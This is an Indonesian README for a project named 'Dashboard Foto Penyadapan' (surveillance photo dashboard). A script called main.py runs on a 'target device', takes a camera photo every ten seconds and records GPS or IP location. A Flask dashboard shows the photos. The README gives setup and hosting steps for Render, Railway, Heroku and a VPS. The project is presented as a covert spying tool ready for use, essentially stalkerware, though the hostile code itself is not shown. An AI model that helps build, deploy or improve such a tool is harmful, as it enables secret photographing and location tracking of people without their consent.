# 📷 Dashboard Foto Penyadapan

Dashboard web otomatis yang menampilkan foto dari kamera beserta lokasi GPS/IP.

## Struktur File

```
penyadapan/
├── main.py          # Script pengambil foto + lokasi (jalankan di perangkat target)
├── dashboard.py     # Flask app dashboard foto
├── wsgi.py          # Entry point untuk hosting (Gunicorn)
├── requirements.txt # Dependensi Python
├── Procfile         # Konfigurasi Heroku
├── render.yaml      # Konfigurasi Render.com
├── railway.json     # Konfigurasi Railway.app
├── runtime.txt      # Versi Python
└── foto_otomatis/   # Folder foto + log (dibuat otomatis oleh main.py)
```

---

## 🚀 Cara Menjalankan Lokal

```bash
# Install dependensi
pip install -r requirements.txt

# Jalankan dashboard
python dashboard.py
# atau pakai gunicorn:
gunicorn wsgi:app --bind 0.0.0.0:5000
```

Buka browser ke `http://localhost:5000`

---

## ☁️ Deploy ke Hosting

### Option 1 — Render.com (Gratis)
1. Push repo ini ke GitHub
2. Buka [render.com](https://render.com) → **New Web Service**
3. Hubungkan repo GitHub → Render otomatis baca `render.yaml`
4. Klik **Deploy**
5. Dapatkan URL publik seperti `https://dashboard-foto.onrender.com`

### Option 2 — Railway.app (Gratis)
1. Push repo ke GitHub
2. Buka [railway.app](https://railway.app) → **New Project** → **Deploy from GitHub**
3. Pilih repo → Railway otomatis baca `railway.json`
4. Klik **Deploy**

### Option 3 — Heroku
```bash
heroku create nama-app-kamu
git push heroku main
heroku open
```

### Option 4 — VPS (DigitalOcean, Contabo, dll)
```bash
git clone <repo-url>
cd penyadapan
pip install -r requirements.txt
gunicorn wsgi:app --bind 0.0.0.0:5000 --workers 2 --daemon
```

---

## ⚙️ Cara Kerja

| File | Fungsi |
|------|--------|
| `main.py` | Dijalankan di **perangkat target** — mengambil foto tiap 10 detik dan menyimpan ke `foto_otomatis/` |
| `dashboard.py` | Server web Flask — membaca log CSV dan menampilkan galeri foto |
| `wsgi.py` | Jembatan antara `dashboard.py` dan Gunicorn (server produksi) |

> **Catatan:** `main.py` harus dijalankan di perangkat yang punya kamera dan akses ke folder `foto_otomatis/`. Dashboard hanya membaca folder itu.

---

## 📦 Dependensi

| Package | Kegunaan |
|---------|----------|
| `flask` | Web framework dashboard |
| `gunicorn` | WSGI server untuk produksi |
| `requests` | Ambil lokasi dari IP |
| `opencv-python-headless` | Akses kamera (versi headless untuk server) |
| `plyer` | GPS asli (opsional, untuk Android/perangkat dengan GPS) |
